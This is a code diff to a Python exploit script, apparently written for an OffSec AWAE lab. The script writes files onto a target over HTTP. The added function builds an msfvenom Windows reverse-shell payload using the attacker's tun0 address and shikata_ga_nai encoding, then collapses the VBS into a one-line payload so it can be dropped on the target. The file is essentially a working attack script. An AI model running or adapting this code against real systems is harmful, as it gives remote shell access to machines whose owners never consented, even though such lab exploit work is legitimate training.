@@ -2,7 +2,28 @@ import sys, re, os
 import requests
 from bs4 import BeautifulSoup
 
+def generate_shell(filename, LPORT):
+	print("Generating MSF Venom Payload......")
+	LHOST = os.popen('ip addr show tun0').read().split("inet ")[1].split("/")[0]
+
+	command = f"msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -e x86/shikata_ga_nai -f vbs > {filename}"
+	# os.popen(command).read()
+
+	with open("shell.vbs", "r") as f:
+		shellcode = f.read()
+	
+	# Perform find-replace operations to create 1-liner shellcode
+	shellcode = re.sub(r' _.*?\n', '', shellcode)
+	shellcode = re.sub(r'\t', '', shellcode)
+	shellcode = re.sub(r'\n', ':', shellcode)
+	while re.findall(r'::', shellcode):
+		shellcode = re.sub(r'::', ':', shellcode)
+
+	with open("shell2.vbs", "w") as f:
+		f.write(shellcode)
+
 def write_to_file(ip, content, filePath):
+
 	print(f"Writing contents into {filePath}......")
 	s = requests.Session()
 
@@ -24,7 +45,6 @@ def write_to_file(ip, content, filePath):
 
 	r = s.get(target, verify = False)
 
-
 def main():
 	if len(sys.argv) != 2:
 		print ("(+) usage: %s <target>" % sys.argv[0])
@@ -33,7 +53,9 @@ def main():
 
 	ip = sys.argv[1]
 
-	write_to_file(ip, "awae", "C:\\Users\\Public\\offsec.txt")
+	generate_shell(filename = "shell.vbs", LPORT = 4444)
+
+	# write_to_file(ip, "awae", "C:\\Users\\Public\\offsec.txt")
 
 if __name__ == '__main__':
 	main()
